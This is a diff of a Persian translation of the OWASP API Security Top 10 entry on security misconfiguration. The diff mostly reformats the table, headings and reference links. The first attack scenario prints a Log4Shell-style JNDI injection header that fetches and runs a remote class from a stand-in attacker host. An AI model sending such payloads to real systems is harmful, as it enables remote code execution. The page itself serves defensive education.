@@ -1,14 +1,12 @@
-
-
 # API8:2023 پیکربندی امنیتی نادرست
----
-| پیامد | عوامل تهدید / مسیر حمله | ضعف امنیتی |
-|------------|--------------------|---------|
-| پیکربندی امنیتی نادرست نه تنها می‌تواند اطلاعات حساس کاربر را افشا کند بلکه جزئیاتی از سیستم که ممکن است به از دست رفتن کامل سرور منجر شود را نیز در معرض خطر قرار می‌دهد. | پیکربندی امنیتی نادرست می‌تواند در هر سطحی از API، از سطح شبکه تا سطح اپلیکشن روی دهد. ابزارهای خودکاری وجود دارند که فرایند تشخیص و بهره برداری از پیکربندی‌های نادرست نظیر تشخیص سرویس‌های غیرضروری را انجام می‌دهند. | مهاجمین غالبا در تلاش برای یافتن حفره‌های وصله نشده، توابع رایج یا فایل‌ها و مسیرهای محافظت نشده به منظور دسترسی غیرمجاز به سیستم هستند. اطلاعات و تکنیک‌های مرتبط با این مسائل به طور عمومی در دسترس بوده و احتمال وقوع حمله در مورد آنها وجود دارد. |
 
+| ضعف امنیتی | عوامل تهدید / مسیر حمله | پیامد |
+|---------|--------------------|------------|
+| خاص API / قابلیت بهره‌برداری: آسان |  میزان شیوع: گسترده/ قابلیت تشخیص: آسان              | پیامد فنی: متوسط / خاص کسب و کار
+| مهاجمین غالبا در تلاش برای یافتن حفره‌های وصله نشده، توابع رایج یا فایل‌ها و مسیرهای محافظت نشده به منظور دسترسی غیرمجاز به سیستم هستند. اطلاعات و تکنیک‌های مرتبط با این مسائل به طور عمومی در دسترس بوده و احتمال وقوع حمله در مورد آنها وجود دارد.              | پیکربندی امنیتی نادرست می‌تواند در هر سطحی از API، از سطح شبکه تا سطح اپلیکشن روی دهد. ابزارهای خودکاری وجود دارند که فرایند تشخیص و بهره برداری از پیکربندی‌های نادرست نظیر تشخیص سرویس‌های غیرضروری را انجام می‌دهند.     | پیکربندی امنیتی نادرست نه تنها می‌تواند اطلاعات حساس کاربر را افشا کند بلکه جزئیاتی از سیستم که ممکن است به از دست رفتن کامل سرور منجر شود را نیز در معرض خطر قرار می‌دهد.         |
 
-### آیا API از نظر پیکربندی امنیتی نادرست‌‌‌آسیب‌پذیر است؟
----
+## آیا API از نظر پیکربندی امنیتی نادرست‌‌‌آسیب‌پذیر است؟
+
 API از منظر پیکربندی امنیتی نادرست ‌‌‌آسیب‌پذیر است اگر:
 
 - ایمن سازی امنیتی مناسب در هر قسمت از پشته اپلیکیشن رعایت نشده یا اپلیکیشن مجوزهای با پیکربندی نادرست روی سرویس‌‌‌‌های ابری داشته باشد.
@@ -20,9 +18,9 @@ API از منظر پیکربندی امنیتی نادرست ‌‌‌آسیب�
 - خط مشی اشتراک متقابل منابع (CORS) وجود نداشته یا به درستی ‌پیاده‌سازی نشده باشد.
 - پیام‌‌‌‌های خطا ردپای پشته یا اطلاعات حساس دیگر را افشا نمایند.
 
-### مثال‌‌‌‌هایی از سناریوهای حمله
----
-#### سناریو #1
+## مثال‌‌‌‌هایی از سناریوهای حمله
+
+### سناریو #1
 
 سروری از API یک نرم‌افزار ثبت دسترسی معتبر و متن‌باز با قابلیت توسعه و پشتیبانی از جستجوهای JNDI (واسطه نام‌گذاری و دایرکتوری جاوا) برای ثبت درخواست‌ها و دسترسی‌ها استفاده می‌کند. برای هر درخواست جدید، یک ورودی جدید با الگوی زیر ثبت می‌شود: `http <method> <api_version>/<path> - <status_code>` یک عامل مخرب، درخواست API مشخصی را ارسال می‌کند که در فایل گزارش دسترسی نوشته می‌شود:
 
@@ -33,8 +31,7 @@ X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
 
 اگر مهاجم از یک سرور کنترل از راه دور برای اجرای یک کد مخرب با نام  `Malicious.class`  استفاده کرده و این کد را در سرآیند درخواست `X-Api-Version` قرار دهد، نرم‌افزار گزارش‌دهی، به دلیل تنظیمات پیش‌فرض ناامن خود، این کد مخرب را از سرور مهاجم دانلود کرده و اجرا می‌کند.
 
-
-#### سناریو #2
+### سناریو #2
 
 یک وب‌سایت شبکه‌ی اجتماعی امکان ارسال "پیام مستقیم" را فراهم کرده که به کاربران امکان برقراری گفت‌وگوی خصوصی را می‌دهد. برای دریافت پیام‌های جدید در یک گفت‌وگو خاص، وب‌سایت درخواست API زیر را ارسال می‌کند (نیازی به تعامل کاربری نیست):
 
@@ -42,11 +39,10 @@ X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
 GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
 ```
 
-
 پاسخ API شامل هدر پاسخ `HTTP Cache-Control` نمی‌شود، به همین علت گفت‌وگوهای خصوصی در مرورگر وب ذخیره شده و به مهاجمان اجازه می‌دهد که آنها را از فایل‌های حافظه نهان مرورگر در فایل‌سیستم بازیابی کنند.
 
-### چگونه از ‌‌‌آسیب‌پذیری پیکربندی امنیتی نادرست پیشگیری کنیم؟
----
+## چگونه از ‌‌‌آسیب‌پذیری پیکربندی امنیتی نادرست پیشگیری کنیم؟
+
 چرخه حیات API بایستی شامل موارد زیر باشد:
 
 - فرایندی تکرار شونده برای ایمن سازی API که منجر به ‌پیاده‌سازی سریع و آسان یک محیط ایمن شود.
@@ -67,29 +63,36 @@ GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
 
 ## مراجع
 
----
+- [OWASP Secure Headers Project][1]
+- [Configuration and Deployment Management Testing - Web Security Testing Guide][2]
+- [Testing for Error Handling - Web Security Testing Guide][3]
+- [Testing for Cross Site Request Forgery - Web Security Testing Guide][4]
 
-- [OWASP](https://owasp.org/)
-- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
-- [Configuration and Deployment Management Testing - Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
-- [Testing for Error Handling - Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
-- [Testing for Cross Site Request Forgery - Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
+### خارجی
 
+- [CWE-2: Environmental Security Flaws][5]
+- [CWE-16: Configuration][6]
+- [CWE-209: Generation of Error Message Containing Sensitive Information][7]
+- [CWE-319: Cleartext Transmission of Sensitive Information][8]
+- [CWE-388: Error Handling][9]
+- [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')][10]
+- [CWE-942: Permissive Cross-domain Policy with Untrusted Domains][11]
+- [Guide to General Server Security][12], NIST
+- [Let's Encrypt: a free, automated, and open Certificate Authority][13]
 
-#### خارجی
-
-
-- [CWE-2: Environmental Security Flaws](https://cwe.mitre.org/data/definitions/2.html)
-- [CWE-16: Configuration](https://cwe.mitre.org/data/definitions/16.html)
-- [CWE-209: Generation of Error Message Containing Sensitive Information](https://cwe.mitre.org/data/definitions/209.html)
-- [CWE-319: Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)
-- [CWE-388: Error Handling](https://cwe.mitre.org/data/definitions/388.html)
-- [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')](https://cwe.mitre.org/data/definitions/444.html)
-- [CWE-942: Permissive Cross-domain Policy with Untrusted Domains](https://cwe.mitre.org/data/definitions/942.html)
-- [Guide to General Server Security NIST](https://csrc.nist.gov/publications/detail/sp/800-123/final)
-- [Let's Encrypt: a free automated and open Certificate Authority](https://letsencrypt.org/)
-
-
+[1]: https://owasp.org/www-project-secure-headers/
+[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README
+[3]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README
+[4]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery
+[5]: https://cwe.mitre.org/data/definitions/2.html
+[6]: https://cwe.mitre.org/data/definitions/16.html
+[7]: https://cwe.mitre.org/data/definitions/209.html
+[8]: https://cwe.mitre.org/data/definitions/319.html
+[9]: https://cwe.mitre.org/data/definitions/388.html
+[10]: https://cwe.mitre.org/data/definitions/444.html
+[11]: https://cwe.mitre.org/data/definitions/942.html
+[12]: https://csrc.nist.gov/publications/detail/sp/800-123/final
+[13]: https://letsencrypt.org/
 
 
   
